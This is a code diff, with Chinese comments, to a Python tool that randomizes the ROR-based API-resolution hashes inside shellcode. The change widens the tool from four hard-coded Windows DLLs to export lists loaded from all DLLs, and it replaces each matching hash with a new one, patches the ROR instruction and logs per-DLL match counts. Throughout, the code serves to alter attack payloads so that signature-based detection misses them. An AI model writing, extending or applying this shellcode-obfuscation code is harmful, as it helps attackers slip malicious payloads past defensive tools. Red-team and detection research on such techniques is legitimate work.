@@ -604,17 +604,23 @@ def verify_shellcode_integrity(original, modified, verbose=False):
 # 原始 API 哈希随机化功能
 # ============================================================================
 
-# API 列表 - 支持动态解析
+# API 列表 - 动态加载所有 DLL
 try:
-    from apihash_lists import k32_list, ws2_list, winnet_list, dnsapi_list, ensure_lists_loaded
+    from apihash_lists import load_api_lists, DEFAULT_DLLS
     
-    # 确保列表已加载
-    ensure_lists_loaded()
+    # 动态加载所有 DLL 的 API 列表
+    _dll_exports = None
     
-    # 检查是否成功加载
-    if not k32_list:
-        logger.warning("API 列表为空,请确保已安装 pefile: pip install pefile")
-        logger.warning("或运行: python dll_parser.py 生成缓存")
+    def get_dll_exports(verbose=False):
+        """获取所有 DLL 的导出函数列表（延迟加载）"""
+        global _dll_exports
+        if _dll_exports is None:
+            _dll_exports = load_api_lists(verbose=verbose)
+            if not _dll_exports or all(len(v) == 0 for v in _dll_exports.values()):
+                logger.warning("API 列表为空,请确保已安装 pefile: pip install pefile")
+                logger.warning("或运行: python dll_parser.py 生成缓存")
+        return _dll_exports
+    
 except ImportError as e:
     logger.error(f"无法导入 API 列表: {e}")
     logger.error("请确保 apihash_lists.py 和 dll_parser.py 在同一目录")
@@ -664,36 +670,46 @@ def randomize_api_hashes(shellcode, arch, old_ror=None, new_ror=None, verbose=Fa
     
     logger.info(f"新 ROR 值: {hex(new_ror)}")
     
-    # 计算旧哈希
-    old_k32 = compute_hashes("kernel32.dll", k32_list, old_ror)
-    old_ws2 = compute_hashes("ws2_32.dll", ws2_list, old_ror)
-    old_winnet = compute_hashes("wininet.dll", winnet_list, old_ror)
-    old_dnsapi = compute_hashes("dnsapi.dll", dnsapi_list, old_ror)
+    # 动态加载所有 DLL 的 API 列表
+    dll_exports = get_dll_exports(verbose=verbose)
     
-    # 计算新哈希
-    new_k32 = compute_hashes("kernel32.dll", k32_list, new_ror)
-    new_ws2 = compute_hashes("ws2_32.dll", ws2_list, new_ror)
-    new_winnet = compute_hashes("wininet.dll", winnet_list, new_ror)
-    new_dnsapi = compute_hashes("dnsapi.dll", dnsapi_list, new_ror)
+    if not dll_exports:
+        logger.error("✗ 无法加载 API 列表")
+        return shellcode, None
+    
+    logger.info(f"加载了 {len(dll_exports)} 个 DLL 的 API 列表")
+    
+    # 计算所有 DLL 的旧/新哈希
+    old_hashes_all = {}
+    new_hashes_all = {}
+    
+    for dll_name, api_list in dll_exports.items():
+        if api_list:  # 跳过空列表
+            old_hashes_all[dll_name] = compute_hashes(dll_name, api_list, old_ror)
+            new_hashes_all[dll_name] = compute_hashes(dll_name, api_list, new_ror)
     
     # 替换哈希
     matchlist = []
+    dll_match_counts = {}  # 统计每个 DLL 匹配的 API 数
     
-    for dll_name, old_hashes, new_hashes in [
-        ("kernel32.dll", old_k32, new_k32),
-        ("ws2_32.dll", old_ws2, new_ws2),
-        ("wininet.dll", old_winnet, new_winnet),
-        ("dnsapi.dll", old_dnsapi, new_dnsapi)
-    ]:
+    for dll_name in old_hashes_all.keys():
+        old_hashes = old_hashes_all[dll_name]
+        new_hashes = new_hashes_all[dll_name]
+        dll_match_count = 0
+        
         for api in old_hashes.keys():
             o = old_hashes[api].to_bytes(4, 'little')
             n = new_hashes[api].to_bytes(4, 'little')
             
             if o in shellcode_array:
                 shellcode_array = bytearray(bytes(shellcode_array).replace(o, n))
-                matchlist.append(api)
+                matchlist.append(f"{dll_name}::{api}")
+                dll_match_count += 1
                 if verbose:
                     logger.debug(f"  {dll_name}::{api}")
+        
+        if dll_match_count > 0:
+            dll_match_counts[dll_name] = dll_match_count
     
     if len(matchlist) == 0:
         logger.error("✗ 未找到任何 API 哈希")
@@ -701,6 +717,12 @@ def randomize_api_hashes(shellcode, arch, old_ror=None, new_ror=None, verbose=Fa
         return shellcode, None
     
     logger.info(f"✓ API 哈希替换: 发现 {len(matchlist)} 个 API")
+    
+    # 显示每个 DLL 的匹配统计
+    if dll_match_counts and verbose:
+        logger.info("  DLL 匹配统计:")
+        for dll_name, count in sorted(dll_match_counts.items(), key=lambda x: -x[1]):
+            logger.info(f"    {dll_name}: {count} 个 API")
     
     # 更新 ROR 指令
     if arch in ["32", "x86"]:
@@ -718,7 +740,9 @@ def randomize_api_hashes(shellcode, arch, old_ror=None, new_ror=None, verbose=Fa
         'old_ror': old_ror,
         'new_ror': new_ror,
         'api_count': len(matchlist),
-        'apis': matchlist
+        'apis': matchlist,
+        'dll_stats': dll_match_counts,  # 每个 DLL 匹配的 API 数
+        'dll_count': len(dll_match_counts)  # 匹配了 API 的 DLL 数量
     }
     
     return bytes(shellcode_array), stats
